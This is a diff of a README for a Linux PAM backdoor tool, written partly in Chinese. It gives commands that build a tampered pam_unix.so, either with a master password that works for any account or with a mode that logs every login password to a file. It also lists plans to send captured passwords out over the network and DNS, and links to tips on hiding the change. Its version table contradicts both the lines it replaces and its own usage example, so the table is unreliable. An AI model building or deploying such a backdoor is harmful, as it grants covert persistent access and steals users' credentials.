@@ -3,41 +3,38 @@ Linux PAM Backdoor
                              
 This script automates the creation of a backdoor for Linux-PAM (Pluggable Authentication Modules)
 
+Modify by 9bie.
+
 ## TODO
- - 添加密码记录
+ - ~添加密码记录(已完成)~
  - 添加发送远程密码
  - 添加使用dns协议发送密码
 
 ## Tips
 遇到undefine yywrap等问题，使用`sudo apt-get install flex` 即可
 
+替换之后修改时间的后渗透操作可以去[一般路过PAM后门 / SSH密码记录](https://9bie.org/index.php/archives/742/) 查看
+
 ## Usage
-To generate the backdoored pam_unix.so, just run:
+
+如果你需要万能密码
 ```
-./backdoor.sh -v 1.3.0 -p som3_s3cr4t_p455w0rd
+./backdoor.sh -m key -v 1.3.0 -p som3_s3cr4t_p455w0rd
 ```
+其中p为你要的万能密码
 
-You have to identify the PAM version installed on the system, to make sure the script will compile the right version. Otherwise you can break the whole system authentication.
 
-After the execution of the script, the last step is to copy the generated pam_unix.so to the pam modules dir on the host. 
-
+如果你需要使用密码记录
 ```
-cp pam_unix.so /usr/lib/security/
+./backdoor.sh -m save -v 1.3.0 -o /tmp/log.txt
 ```
-
-That's all. 
-
-After that, you can log-in to the system using an existing user, and the previously configured password.
-
-Use this for educational purposes only.
-I am not responsible for the damage you might cause.
-
+其中o为密码保存路径
 ## Dependencies 
 
-Tested with ubuntu 20.04: 
-* 1.1.8 and older: failed to compile
-* 1.2.0: worked
-* 1.3.0 to 1.4.0: worked
+
+* 1.1.8 and older: 它工作
+* 1.2.0: 它工作
+* 1.3.0 to 1.4.0: 不工作
 
 The following packages where used
 ```bash
